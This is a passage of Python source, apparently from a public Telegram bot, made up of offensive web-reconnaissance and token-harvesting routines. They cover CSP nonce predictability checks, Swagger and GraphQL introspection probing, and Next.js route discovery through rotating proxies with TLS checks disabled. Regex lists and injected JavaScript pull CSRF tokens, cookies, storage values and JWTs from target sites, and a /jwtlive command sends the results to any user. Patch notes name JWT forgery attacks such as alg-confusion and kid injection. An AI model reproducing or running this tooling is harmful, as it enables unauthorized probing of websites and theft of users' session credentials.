            freq[c] = freq.get(c, 0) + 1
        n = len(s)
        return -sum((cnt/n) * math.log2(cnt/n) for cnt in freq.values())

    def _is_sequential(lst: list) -> bool:
        """Detect counter-based nonces: if decoded ints differ by constant delta."""
        ints = []
        for val in lst:
            try:
                padded = val + "=" * (-len(val) % 4)
                raw = _b64n.b64decode(padded)
                ints.append(int.from_bytes(raw[-4:], "big"))
            except Exception:
                return False
        if len(ints) < 3:
            return False
        deltas = [ints[i+1]-ints[i] for i in range(len(ints)-1)]
        return len(set(deltas)) == 1  # all same delta → sequential

    try:
        for _ in range(4):
            r = requests.get(url, timeout=8, verify=False,
                             headers=_get_headers(), proxies=proxy_manager.get_proxy())
            csp = r.headers.get("Content-Security-Policy", "")
            for nonce in re.findall(r"'nonce-([A-Za-z0-9+/=]{8,200})'", csp):
                nonces_seen.append(nonce)

        if not nonces_seen:
            return findings

        rotates    = len(set(nonces_seen)) > 1
        entropy    = _shannon_entropy(nonces_seen[0])
        sequential = _is_sequential(list(set(nonces_seen))) if rotates else False

        # Risk assessment
        if not rotates:
            risk = "HIGH — static nonce reused across all requests"
        elif sequential:
            risk = "HIGH — nonce appears sequential/counter-based (predictable)"
        elif entropy < 3.5:
            risk = f"MEDIUM — low entropy ({entropy:.2f} bits/char), may be guessable"
        else:
            risk = f"OK — rotating, entropy {entropy:.2f} bits/char"

        findings.append({
            "type":     "CSP Nonce",
            "name":     "nonce",
            "value":    nonces_seen[0],
            "source":   "Content-Security-Policy header",
            "rotates":  rotates,
            "entropy":  round(entropy, 2),
            "sequential": sequential,
            "risk":     risk,
            "note":     (
                f"Rotation: {'yes' if rotates else 'NO — STATIC'}  |  "
                f"Entropy: {entropy:.2f} bits/char  |  "
                f"Sequential: {'YES — predictable' if sequential else 'no'}  |  "
                f"Risk: {risk}"
            ),
        })
    except Exception:
        pass
    return findings




_SWAGGER_PATHS = [
    "/swagger.json", "/swagger.yaml", "/openapi.json",
    "/openapi.yaml", "/api-docs", "/api-docs/", "/v2/api-docs",
    "/v3/api-docs", "/api/swagger.json", "/api/openapi.json",
    "/redoc", "/docs", "/documentation",
]


_GRAPHQL_INTROSPECTION = """
{
  __schema {
    types { name kind fields { name type { name kind } } }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
""".strip()



def _fetch_swagger_spec(base_url: str) -> list:
    """Try common Swagger/OpenAPI paths and return parsed endpoints."""
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    results = []
    for path in _SWAGGER_PATHS:
        try:
            r = requests.get(
                origin + path, timeout=6, verify=False,
                headers=_get_headers(), proxies=proxy_manager.get_proxy()
            )
            if r.status_code == 200 and len(r.text) > 100:
                ct = r.headers.get("Content-Type", "")
                if "json" in ct or "yaml" in ct or path.endswith((".json", ".yaml")):
                    try:
                        spec = r.json()
                        paths_obj = spec.get("paths", {})
                        if paths_obj:
                            results.append({
                                "spec_url": origin + path,
                                "endpoints": list(paths_obj.keys())[:50],
                                "title": spec.get("info", {}).get("title", "Unknown"),
                                "version": spec.get("info", {}).get("version", ""),
                            })
                    except Exception:
                        results.append({
                            "spec_url": origin + path,
                            "endpoints": [],
                            "raw_preview": r.text[:300],
                        })
        except Exception:
            pass
    return results



def _probe_graphql(base_url: str) -> dict:
    """Run GraphQL introspection on common endpoints."""
    parsed   = urlparse(base_url)
    origin   = f"{parsed.scheme}://{parsed.netloc}"
    gql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql"]
    for gql_path in gql_paths:
        try:
            r = requests.post(
                origin + gql_path,
                json={"query": _GRAPHQL_INTROSPECTION},
                timeout=8, verify=False,
                headers={**_get_headers(), "Content-Type": "application/json"},
                proxies=proxy_manager.get_proxy()
            )
            if r.status_code == 200:
                data = r.json()
                schema = data.get("data", {}).get("__schema", {})
                if schema:
                    types = [t["name"] for t in schema.get("types", [])
                             if not t["name"].startswith("__")]
                    return {
                        "vulnerable": True,
                        "endpoint":   origin + gql_path,
                        "types":      types[:30],
                        "query_type": (schema.get("queryType") or {}).get("name"),
                        "mutation_type": (schema.get("mutationType") or {}).get("name"),
                    }
        except Exception:
            pass
    return {"vulnerable": False}



def _fetch_next_routes(base_url: str) -> list:
    """Parse Next.js _buildManifest.js for client-side routes."""
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    routes = []
    try:
        # Find the manifest URL from HTML
        r = requests.get(
            base_url, timeout=8, verify=False,
            headers=_get_headers(), proxies=proxy_manager.get_proxy()
        )
        manifest_urls = re.findall(
            r'/_next/static/[^"\']+/_buildManifest\.js', r.text
        )
        for mu in manifest_urls[:2]:
            try:
                mr = requests.get(
                    origin + mu, timeout=6, verify=False,
                    headers=_get_headers(), proxies=proxy_manager.get_proxy()
                )
                found = re.findall(r'"(/[^"]+)"', mr.text)
                routes.extend([f for f in found if f.startswith("/") and len(f) > 1])
            except Exception:
                pass
    except Exception:
        pass
    return list(dict.fromkeys(routes))[:60]



_OAUTH_TOKEN_ENDPOINTS = [
    "/oauth/token", "/auth/token", "/token", "/oauth2/token",
    "/connect/token", "/api/auth/token", "/realms/master/protocol/openid-connect/token",
]

# Append these new patterns to existing _OAUTH_PATTERNS list

_OAUTH_PATTERNS_EXTRA = [
    ("OAuth state param",
     re.compile(r'(?i)[?&]state=([A-Za-z0-9_\-\.]{8,100})')),
    ("PKCE code_challenge",
     re.compile(r'(?i)code_challenge(?:_method)?\s*[=:]\s*["\']?([A-Za-z0-9+/=._-]{10,200})["\']?')),
    ("Implicit access_token (fragment)",
     re.compile(r'(?i)[#&]access_token=([A-Za-z0-9_\-\.]{20,500})')),
    ("OAuth scope",
     re.compile(r'(?i)[?&]scope=([A-Za-z0-9_%+\s:./]{5,200})')),
    ("OIDC nonce",
     re.compile(r'(?i)[?&]nonce=([A-Za-z0-9_\-\.]{8,100})')),
]


_CSRF_PATTERNS = [
    # Original patterns
    ("CSRF Token",               re.compile(r'(?i)(?:csrf|xsrf|_token|verification.token)\s*[=:]\s*["\']([A-Za-z0-9_\-+=/]{20,200})["\']')),
    ("Nonce",                    re.compile(r'(?i)(?:nonce|__nonce__)\s*[=:]\s*["\']([A-Za-z0-9+/=]{20,100})["\']')),
    ("Laravel CSRF Token",       re.compile(r'(?i)(?:_token|laravel.token)\s*[=:]\s*["\']([A-Za-z0-9+/=]{40,80})["\']')),
    ("Django CSRF",              re.compile(r'(?i)csrfmiddlewaretoken\s*[=:]\s*["\']([A-Za-z0-9]{40,80})["\']')),
    ("Rails Authenticity Token", re.compile(r'(?i)authenticity.token\s*[=:]\s*["\']([A-Za-z0-9+/=]{40,100})["\']')),
    ("WordPress Nonce",          re.compile(r'(?i)wp.{0,5}nonce\s*[=:]\s*["\']([A-Za-z0-9]{10})["\']')),
    ("JWT Bearer Token",         re.compile(r'(?i)(?:bearer|authorization)\s*[=:]\s*["\']?(eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)')),
    # 15 NEW patterns
    ("Meta CSRF Token",          re.compile(r'<meta[^>]+name=["\'](?:csrf-token|_csrf|xsrf-token)["\'][^>]+content=["\']([A-Za-z0-9_\-+=/]{16,200})["\']', re.I)),
    ("Meta CSRF (reversed)",     re.compile(r'<meta[^>]+content=["\']([A-Za-z0-9_\-+=/]{16,200})["\'][^>]+name=["\'](?:csrf-token|_csrf|xsrf-token)["\']', re.I)),
    ("Angular XSRF Cookie",      re.compile(r'(?i)XSRF-TOKEN\s*[=:]\s*["\']?([A-Za-z0-9_\-+=/]{20,200})["\']?')),
    ("Spring CSRF",              re.compile(r'(?i)_csrf(?:Token|Header|ParameterName)?\s*[=:]\s*["\']([A-Za-z0-9_\-+=/]{16,200})["\']')),
    ("Symfony CSRF",             re.compile(r'(?i)_token\s*[=:]\s*["\']([A-Za-z0-9_\-]{40,100})["\']')),
    ("ASP.NET ViewState",        re.compile(r'__VIEWSTATE["\s]*value=["\']([A-Za-z0-9+/=]{20,5000})["\']')),
    ("ASP.NET RequestToken",     re.compile(r'__RequestVerificationToken[^>]*value=["\']([A-Za-z0-9+/=_\-]{20,500})["\']')),
    ("Flask WTF CSRF",           re.compile(r'(?i)csrf_token\s*[=:]\s*["\']([A-Za-z0-9_\-+=/]{20,200})["\']')),
    ("Drupal Form Token",        re.compile(r'(?i)form_build_id\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,200})["\']')),
    ("Drupal CSRF Token",        re.compile(r'(?i)(?:X-CSRF-Token|drupal.settings.csrf)\s*[=:]\s*["\']([A-Za-z0-9_\-+=/]{20,200})["\']')),
    ("Next.js CSRF",             re.compile(r'(?i)__Host-next-auth\.csrf-token\s*[=:]\s*["\']?([A-Za-z0-9_\-+=/|]{30,300})["\']?')),
    # Phase 2 Fix 5: CSRF vs OAuth state distinguish
    # Only flag state= as CSRF if near csrf/auth/nonce context — not bare state= (form field)
    ("OAuth CSRF state param",   re.compile(
        r'(?:oauth|authorize|auth|redirect_uri|client_id).{0,200}[?&]state=([A-Za-z0-9_\-\.]{16,100})'
        r'|[?&]state=([A-Za-z0-9_\-\.]{16,100}).{0,200}(?:oauth|redirect_uri|client_id)', re.I
    )),
    ("API Signature Nonce",      re.compile(r'(?i)(?:api.nonce|request.nonce|x-nonce)\s*[=:]\s*["\']?([A-Za-z0-9_\-]{8,64})["\']?')),
    ("Recaptcha Token",          re.compile(r'(?i)g-recaptcha-response["\s]*value=["\']([A-Za-z0-9_\-]{20,2048})["\']')),
]

# New JS eval string — add IndexedDB scan
def _hiddenkeys_sync(url: str, progress_cb=None) -> dict:
    """Improved hidden key extractor — meta, CSP nonce, sw.js, IndexedDB, 22 patterns."""
    data = _extract_run(url, _HIDDEN_JS_EVAL_IMPROVED, progress_cb)
    if data.get("error"):
        return {"error": data["error"], "findings": [], "page_url": url}

    # ── Option A + B ──────────────────────────────────────────────────
    if progress_cb: progress_cb("🌐 Dynamic hidden key intercept + deep fetch...")
    dyn        = _playwright_dynamic_scan(url, "hiddenkeys", progress_cb)
    new_assets = _deep_asset_fetch(url, data.get("network_log", []), progress_cb)
    data       = _merge_dynamic_into_data(data, dyn, new_assets)

    # Merge hidden hook: XHR headers, meta token
    hidden_hook = dyn.get("hooks", {}).get("hidden", {})
    if hidden_hook:
        dr = data.get("dom_result") or {}
        for k, v in hidden_hook.items():
            if v:
                dr[f"dyn_hidden_{k}"] = str(v)[:500]
        data["dom_result"] = dr

    findings = []
    seen     = set()

    def _add(t, name, value, src):
        # dedup key: [:80] — [:30] was too narrow, UUID prefix collisions ဖြစ်တတ်
        d = t + ":" + name + ":" + value[:80]
        if d not in seen and len(value) >= 5:
            seen.add(d)
            findings.append({"type": t, "name": name, "value": value[:200], "source": src})

    if progress_cb:
        progress_cb("🔍 Extracting CSRF tokens, meta tags, CSP nonce, localStorage...")

    # DOM eval results
    dr = data.get("dom_result") or {}
    for tok in dr.get("tokens", []):
        n, v, tag = tok.get("name", ""), tok.get("value", ""), tok.get("tag", "")
        if v:
            ktype = "CSRF Token" if any(
                x in n.lower() for x in ["csrf", "xsrf", "token", "nonce", "verify"]
            ) else ("Meta Token" if tag == "META" else "Hidden Input")
            _add(ktype, n, v, f"DOM {tag}")

    for k, v in dr.get("localStorage", {}).items():
        ktype = "JWT (localStorage)" if v.startswith("eyJ") else "localStorage value"
        _add(ktype, k, v, "localStorage")

    for k, v in dr.get("sessionStorage", {}).items():
        ktype = "JWT (sessionStorage)" if v.startswith("eyJ") else "sessionStorage value"
        _add(ktype, k, v, "sessionStorage")

    for c in dr.get("cookies", []):
        n, v = c.get("name", ""), c.get("value", "")
        ktype = "JWT (cookie)" if v.startswith("eyJ") else "Cookie"
        _add(ktype, n, v, "Cookie (JS-readable)")

    for idb_name in dr.get("indexedDBKeys", []):
        if str(idb_name).startswith("__idb_error__"):
            # IDB scan failed — log warning, skip as finding
            logger.warning("IndexedDB scan failed: %s", idb_name)
            continue
        _add("IndexedDB database", idb_name, idb_name, "IndexedDB")

    # ShadowDOM tokens (pierce scan from Playwright)
    for stok in dr.get("__shadow_tokens__", []):
        n = stok.get("name", "shadow-hidden")
        v = stok.get("value", "")
        if v:
            ktype = "CSRF Token (Shadow)" if any(
                x in n.lower() for x in ["csrf", "xsrf", "token", "nonce", "verify"]
            ) else "Hidden Input (Shadow)"
            _add(ktype, n, v, "ShadowDOM pierce")

    # Pattern scan on all text
    for text, label in _gather_all_text(data):
        for key_type, pat in _CSRF_PATTERNS:
            for m in pat.finditer(text):
                val = m.group(1) if m.lastindex else m.group(0)
                _add(key_type, key_type, val.strip(), label)

    # CSP header nonce
    if progress_cb:
        progress_cb("🔍 Checking CSP header for nonce...")
    csp_findings = _extract_csp_nonce(url)
    for f in csp_findings:
        _add(f["type"], f["name"], f["value"], f["source"])

    # Service worker scan
    if progress_cb:
        progress_cb("🔍 Scanning service workers (sw.js)...")
    sw_findings = _scan_service_worker(url)
    for f in sw_findings:
        _add(f["type"], f["name"], f["value"], f["source"])

    # Phase 3 Fix 6: GraphQL persisted query token extraction
    if progress_cb:
        progress_cb("🔮 Scanning GraphQL persisted queries for tokens...")
    _gql_pat = re.compile(r'["\'](query|mutation)["\'\s]*[:{]', re.I)
    _gql_val_pat = re.compile(r'"(variables|extensions)"\s*:\s*\{([^}]{10,500})\}')
    for text, label in _gather_all_text(data):
        # Scan GQL variables/extensions blocks for embedded tokens
        for gm in _gql_val_pat.finditer(text):
            qval = gm.group(2).strip()
            for key_type, pat in _CSRF_PATTERNS:
                for km in pat.finditer(qval):
                    val = (km.group(1) if km.lastindex else km.group(0)).strip()
                    _add(key_type + " (GraphQL)", key_type, val, f"GQL vars in {label[:50]}")
            for key_type, pat in _API_KEY_PATTERNS:
                for km in pat.finditer(qval):
                    val = (km.group(1) if km.lastindex else km.group(0)).strip()
                    _add(key_type + " (GraphQL)", val, f"GQL vars in {label[:50]}")

    # Phase 3 Fix 7: WebSocket frame token scan
    for wsf in data.get("ws_frames", []):
        payload = wsf.get("payload", "")
        if not payload:
            continue
        ws_src = f"WebSocket {wsf.get('dir','')} {wsf.get('url','')[:60]}"
        for key_type, pat in _CSRF_PATTERNS:
            for m in pat.finditer(payload):
                val = (m.group(1) if m.lastindex else m.group(0)).strip()
                _add(key_type + " (WebSocket)", key_type, val, ws_src)
        # JWT in WS payload
        for jm in re.finditer(r'(eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)', payload):
            _add("JWT (WebSocket)", "jwt", jm.group(1), ws_src)

    # Phase 2 Fix 6: sort findings by severity (CRITICAL first)
    _HIDDEN_SEV = {
        "CSRF Token (Shadow)": 0, "JWT": 1,
        "CSRF Token": 2, "CSP Nonce": 3, "IndexedDB database": 4,
        "Workbox": 5, "SW cache": 5, "SW Scope": 6,
    }
    def _hidden_sev_key(f):
        t = f.get("type", "")
        for k, v in _HIDDEN_SEV.items():
            if k in t:
                return v
        return 9
    findings.sort(key=_hidden_sev_key)

    return {
        "error":    None,
        "findings": findings,
        "page_url": data["page_url"],
        "requests": len(data.get("network_log", [])),
        "csp_nonces":      [f for f in findings if "CSP Nonce" in f["type"]],
        "sw_findings":     sw_findings,
        "indexeddb_names": [k for k in dr.get("indexedDBKeys", []) if not str(k).startswith("__idb_error__")],
        "shadow_count":    len([f for f in findings if "Shadow" in f.get("type","")]),
        "env_injections":  len([f for f in findings if "env" in f.get("type","").lower()]),
    }


# ═══════════════════════════════════════════════════════════════════
# END OF PATCH
# Summary of paste locations in web_downloader_bot_v17_fixed.py:
#
#  Function                  | Original line | Replace with
#  ──────────────────────────┼───────────────┼──────────────────────
#  _vuln_scan_sync           | ~2060         | [1] above
#  _format_vuln_report       | ~2145         | [1] above
#  _jwt_none_attack          | ~5500         | [2] above
#  _jwt_kid_injection        | NEW           | [2] above (add new)
#  _jwt_exp_forgery          | NEW           | [2] above (add new)
#  _jwt_jwks_spoof           | NEW           | [2] above (add new)
#  _jwt_alg_confusion        | ~5524         | [2] above
#  _jwt_brute_force          | ~5550         | [2] above
#  _fuzz_sync                | ~4252         | [3] above
#  _smartfuzz_probe_sync     | ~5231         | [3] above
#  _endpoints_sync           | ~8865         | [4] above
#  _oauthscan_sync           | ~17863        | [5] above
#  _CSRF_PATTERNS            | ~8696         | [6] above (replace)
#  _HIDDEN_JS_EVAL           | ~8654         | use _HIDDEN_JS_EVAL_IMPROVED
#  _hiddenkeys_sync          | ~8706         | [6] above
# ═══════════════════════════════════════════════════════════════════
_ENDPOINT_PATTERNS = [
    ("REST API",    re.compile(r'(?i)["\']/(api/v?\d?/?[a-zA-Z0-9_/\-]{3,80})["\']')),
    ("GraphQL",     re.compile(r'(?i)["\']?((?:https?://[^"\']+)?/graphql(?:/v\d)?)["\']?')),
    ("WebSocket",   re.compile(r'(wss?://[A-Za-z0-9._\-/:?=&%]{10,200})')),
    ("REST base URL",re.compile(r'(?i)(?:base.?url|api.?url|api.?endpoint|api.?base)\s*[=:]\s*["\']?(https?://[A-Za-z0-9._\-/:?=&%]{10,150})["\']?')),
    ("gRPC",        re.compile(r'(?i)(?:grpc|protobuf).{0,20}[=:\s]["\']?(https?://[A-Za-z0-9._\-/:]{10,100})["\']?')),
    ("Supabase URL",re.compile(r'(https://[a-z0-9]{20}\.supabase\.(?:co|io))')),
    ("Hasura URL",  re.compile(r'(https://[A-Za-z0-9._\-]+/v1/graphql)')),
    ("Prismic",     re.compile(r'(https://[a-z0-9\-]+\.prismic\.io/api)')),
    ("Contentful",  re.compile(r'(https://cdn\.contentful\.com/spaces/[A-Za-z0-9]+)')),
    ("Sanity",      re.compile(r'(https://[a-z0-9]+\.api\.sanity\.io/v\d+/data/query)')),
    ("S3 Bucket",   re.compile(r'(https?://[A-Za-z0-9.\-]+\.s3(?:\.[a-z0-9\-]+)?\.amazonaws\.com)')),
    ("CDN URL",     re.compile(r'(https://[A-Za-z0-9.\-]+\.(?:cloudfront\.net|azureedge\.net|akamaized\.net))')),
]

_ENDPOINT_JS_EVAL = """() => {
    const res = {websockets: [], fetch_urls: [], xhr_urls: []};
    // Intercept WebSocket (if already opened)
    try {
        if (window._wsLog) res.websockets = window._wsLog;
    } catch(e) {}
    // Scan window env for API URLs
    ['__NEXT_DATA__','__nuxt','window.__ENV__'].forEach(k => {
        try {
            const v = eval(k);
            if (v) {
                const s = JSON.stringify(v)||'';
                const urls = s.match(/https?:\\/\\/[A-Za-z0-9._\\-\\/:?=&%]{10,150}/g)||[];
                res['env_urls_'+k] = [...new Set(urls)].slice(0,20);
            }
        } catch(e) {}
    });
    return res;
}"""

def _endpoints_sync(url: str, progress_cb=None) -> dict:
    """Improved endpoint discovery — Swagger + GraphQL + Next.js routes + gRPC."""
    data = _extract_run(url, _ENDPOINT_JS_EVAL, progress_cb)
    if data.get("error"):
        return {"error": data["error"], "findings": [], "page_url": url}

    findings = []
    seen     = set()

    def _add(t, v, src):
        d = t + ":" + v
        if d not in seen and len(v) >= 8:
            seen.add(d)
            findings.append({"type": t, "endpoint": v, "source": src})

    if progress_cb:
        progress_cb("🔍 Scanning endpoints, fetching Swagger/OpenAPI specs...")

    # ── Pattern scan on HTML + JS corpus ─────────
    for text, label in _gather_all_text(data):
        for key_type, pat in _ENDPOINT_PATTERNS:
            for m in pat.finditer(text):
                val = m.group(1) if m.lastindex else m.group(0)
                _add(key_type, val.strip().rstrip("\"'"), label)

    # ── Network log from Playwright ───────────────
    for entry in data.get("network_log", []):
        u = entry.get("url", "")
        if any(x in u for x in ["/api/", "/graphql", "/v1/", "/v2/", "/v3/"]):
            _add("Actual API call", u[:150], "Network request")
        if u.startswith("wss://") or u.startswith("ws://"):
            _add("WebSocket (live)", u[:150], "Network request")
        # gRPC-web detection
        ct = entry.get("content_type", "")
        if "grpc" in ct.lower() or "application/grpc" in ct.lower():
            _add("gRPC-web endpoint", u[:150], "Network (grpc content-type)")

    # ── DOM eval env URLs ─────────────────────────
    dr = data.get("dom_result") or {}
    for k, v in dr.items():
        if isinstance(v, list):
            for item in v:
                if isinstance(item, str) and item.startswith("http"):
                    _add("Env URL", item[:150], f"window env {k}")

    # ── Swagger / OpenAPI spec fetch ──────────────
    if progress_cb:
        progress_cb("📄 Fetching Swagger/OpenAPI specs...")
    swagger_specs = _fetch_swagger_spec(url)
    for spec in swagger_specs:
        _add("OpenAPI spec", spec["spec_url"], "Swagger discovery")
        for ep in spec.get("endpoints", [])[:20]:
            _add("OpenAPI endpoint", ep, f"Spec: {spec['spec_url']}")

    # ── GraphQL introspection ─────────────────────
    if progress_cb:
        progress_cb("🔮 Probing GraphQL introspection...")
    gql = _probe_graphql(url)
    if gql["vulnerable"]:
        _add("GraphQL endpoint", gql["endpoint"], "Introspection")
        for t in gql.get("types", []):
            _add("GraphQL type", t, gql["endpoint"])

    # ── Next.js route manifest ────────────────────
    if progress_cb:
        progress_cb("📦 Checking Next.js build manifest...")
    next_routes = _fetch_next_routes(url)
    for route in next_routes:
        _add("Next.js route", route, "_buildManifest.js")

    # Group versioned endpoints
    versioned = {}
    for f in findings:
        ep = f["endpoint"]
        m  = re.search(r"/(v\d+)/", ep)
        if m:
            ver = m.group(1)
            versioned.setdefault(ver, []).append(ep)

    return {
        "error":       None,
        "findings":    findings,
        "page_url":    data["page_url"],
        "requests":    len(data.get("network_log", [])),
        "swagger":     swagger_specs,
        "graphql":     gql,
        "next_routes": next_routes,
        "versioned":   versioned,
    }


# ───────────────────────────────────────────────────────────────────
# [5] REPLACE _oauthscan_sync (original: line ~17863)
#     IMPROVEMENTS:
#       + Extract all redirect_uri values from HTML/JS
#       + PKCE detection (code_challenge_method)
#       + Implicit flow: scan URL fragment #access_token
#       + Missing state= → flag as CSRF risk
#       + Scan /oauth/token /auth/token /token endpoints
# ───────────────────────────────────────────────────────────────────

_JWT_LIVE_JS_EVAL = """() => {
    const res = {tokens: []};
    const seen = new Set();
    function addJWT(token, source) {
        if (!token || seen.has(token)) return;
        if (!/^eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]*$/.test(token)) return;
        seen.add(token);
        let payload = {};
        try {
            const b64 = token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/');
            payload = JSON.parse(atob(b64));
        } catch(e) {}
        res.tokens.push({token, source, payload,
            exp: payload.exp ? new Date(payload.exp*1000).toISOString() : '',
            sub: payload.sub || payload.user_id || payload.uid || payload.id || '',
            iss: payload.iss || '', aud: payload.aud || ''});
    }
    // localStorage
    try {
        for (let i=0;i<localStorage.length;i++) {
            const k=localStorage.key(i), v=localStorage.getItem(k)||'';
            if (v.startsWith('eyJ')) addJWT(v, 'localStorage:'+k);
            try { const o=JSON.parse(v); if(o&&typeof o==='object') {
                Object.values(o).forEach(x=>{if(typeof x==='string'&&x.startsWith('eyJ'))addJWT(x,'localStorage:'+k+'.value');});
            }} catch(e){}
        }
    } catch(e) {}
    // sessionStorage
    try {
        for (let i=0;i<sessionStorage.length;i++) {
            const k=sessionStorage.key(i), v=sessionStorage.getItem(k)||'';
            if (v.startsWith('eyJ')) addJWT(v,'sessionStorage:'+k);
        }
    } catch(e) {}
    // Cookies
    try {
        document.cookie.split(';').forEach(c=>{
            const [k,v]=(c.trim()).split('=');
            if(v&&v.startsWith('eyJ')) addJWT(decodeURIComponent(v),'cookie:'+k.trim());
        });
    } catch(e) {}
    // window globals
    ['token','authToken','accessToken','idToken','jwtToken','auth','user','session'].forEach(k=>{
        try{const v=window[k];if(typeof v==='string'&&v.startsWith('eyJ'))addJWT(v,'window.'+k);}catch(e){}
        try{const v=window[k];if(v&&typeof v==='object'){
            ['token','access_token','id_token','jwt'].forEach(f=>{
                if(v[f]&&typeof v[f]==='string'&&v[f].startsWith('eyJ'))addJWT(v[f],'window.'+k+'.'+f);
            });
        }}catch(e){}
    });
    return res;
}"""

def _jwtlive_sync(url: str, progress_cb=None) -> dict:
    data = _extract_run(url, _JWT_LIVE_JS_EVAL, progress_cb)
    if data.get("error"):
        return {"error": data["error"], "findings": [], "page_url": url}
    findings = []
    dr = data.get("dom_result") or {}
    for tok in dr.get("tokens", []):
        findings.append(tok)
    # Also scan network responses for Bearer tokens
    seen_net = set()
    for entry in data.get("network_log", []):
        for text in [entry.get("response_body",""), entry.get("post_data","")]:
            for m in re.finditer(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', text):
                t = m.group(0)
                if t not in seen_net:
                    seen_net.add(t)
                    payload = {}
                    try:
                        import base64
                        b64 = t.split(".")[1] + "=="
                        payload = json.loads(base64.b64decode(b64.replace("-","+").replace("_","/")))
                    except Exception:
                        pass
                    findings.append({"token": t, "source": f"Network: {entry['url'][:80]}",
                                     "payload": payload,
                                     "exp": payload.get("exp",""), "sub": payload.get("sub",""),
                                     "iss": payload.get("iss",""), "aud": payload.get("aud","")})
    return {"error": None, "findings": findings, "page_url": data["page_url"],
            "requests": len(data.get("network_log", []))}


async def cmd_jwtlive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/jwtlive <url> — Extract live JWT tokens from browser storage & network"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/jwtlive https://app.example.com`\n\n"
            "🔒 *Extracts live JWTs from:*\n"
            "  • localStorage / sessionStorage\n"
            "  • JavaScript-readable cookies\n"
            "  • window globals (token, authToken, etc.)\n"
            "  • Network API responses\n\n"
            "📋 *Decoded payload shows:*\n"
            "  • `sub` — User/subject ID\n"
            "  • `exp` — Expiry datetime\n"
            "  • `iss` — Issuer\n"
            "  • `aud` — Audience\n\n"
            "⚠️ _Authorized testing only_", parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith("http"): url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🔒 *JWT Extractor — `{domain}`*\n\n⏳ Loading page & scanning storage...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"🔒 *JWT Live — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(_jwtlive_sync, url, lambda t: progress_q.append(t))
    except Exception as e:
        prog.cancel(); await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown'); return
    finally:
        prog.cancel()
    if result.get("error"):
        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown'); return
    findings = result["findings"]; page_url = result["page_url"]
    if not findings:
        await msg.edit_text(
            f"🔒 *JWT Extractor — `{domain}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📭 No JWT tokens found (may require login)\n🌐 `{page_url}`", parse_mode='Markdown')
        return
    lines = [f"🔒 *JWT Tokens — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
             f"🌐 `{page_url}`", f"✅ Found: `{len(findings)}`\n"]
    for i, f in enumerate(findings, 1):
        tok = f.get("token","")
        lines.append(f"*[{i}] JWT Token*")
        lines.append(f"  `{tok[:60]}...`")
        lines.append(f"  _📂 {f.get('source','')[:60]}_")
        if f.get("sub"):  lines.append(f"  👤 `sub` : `{f['sub']}`")
        if f.get("exp"):  lines.append(f"  ⏰ `exp` : `{f['exp']}`")
        if f.get("iss"):  lines.append(f"  🏢 `iss` : `{f['iss']}`")
        if f.get("aud"):  lines.append(f"  🎯 `aud` : `{str(f['aud'])[:50]}`")
        lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━\n⚠️ _Authorized testing only_")
    report = "\n".join(lines)
    try:
        if len(report) <= 4000: await msg.edit_text(report, parse_mode='Markdown')
        else: await msg.edit_text(report[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
    import io as _io
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=_io.BytesIO(json.dumps({"domain": domain, "page_url": page_url,
                "scanned_at": datetime.now().isoformat(), "findings": findings},
                indent=2, ensure_ascii=False).encode()),
            filename=f"jwtlive_{safe_d}_{ts}.json",
            caption=f"🔒 JWT Live — `{domain}` — `{len(findings)}` tokens",
            parse_mode='Markdown')
    except Exception as e:
        logger.warning("jwtlive export error: %s", e)


# ══════════════════════════════════════════════════
# 📡  9. /pushkeys — Push / CDN / Notification Keys
# ══════════════════════════════════════════════════

_PUSH_PATTERNS = [
    ("VAPID Public Key",        re.compile(r'(?i)(?:vapid|push|applicationServer).{0,30}key.{0,10}[=:\s]["\']?(B[A-Za-z0-9+/=_\-]{80,90})\b')),
    ("FCM Server Key",          re.compile(r'(?i)(?:fcm|firebase).{0,20}(?:server|sender).{0,10}key.{0,10}[=:\s]["\']?([A-Za-z0-9_\-]{140,200})\b')),
    ("FCM Sender ID",           re.compile(r'(?i)(?:fcm|firebase|messaging).{0,20}sender.{0,5}id.{0,10}[=:\s]["\']?(\d{10,15})\b')),
    ("OneSignal App ID",        re.compile(r'(?i)onesignal.{0,20}app.{0,5}id.{0,10}[=:\s]["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']')),
